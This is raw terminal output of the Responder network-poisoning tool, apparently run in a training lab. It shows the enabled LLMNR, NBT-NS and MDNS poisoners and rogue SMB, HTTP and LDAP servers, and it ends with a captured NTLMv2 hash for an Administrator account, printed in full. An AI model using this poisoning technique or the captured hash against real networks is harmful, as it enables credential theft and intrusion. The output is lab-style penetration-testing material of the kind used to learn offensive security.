â¯ sudo responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.16.16]
    Responder IPv6             [dead:beef:4::100e]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-MCCUXLEX93U]
    Responder Domain Name      [W52X.LOCAL]
    Responder DCE-RPC Port     [48172]

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.129.58.24
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:9d6154f9d70e4e0a:B32E1747639353327D31B495BC9722AE:0101000000000000008D95DF01DBD801F82F924BFE87CBC90000000002000800570035003200580001001E00570049004E002D004D0043004300550058004C004500580039003300550004003400570049004E002D004D0043004300550058004C00450058003900330055002E0057003500320058002E004C004F00430041004C000300140057003500320058002E004C004F00430041004C000500140057003500320058002E004C004F00430041004C0007000800008D95DF01DBD80106000400020000000800300030000000000000000100000000200000777BCBC5BD3B71F526CDEAD0606B6A3DD9B68D419863C957AB0AE98B1C3700750A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00310036000000000000000000
[+] Exiting...

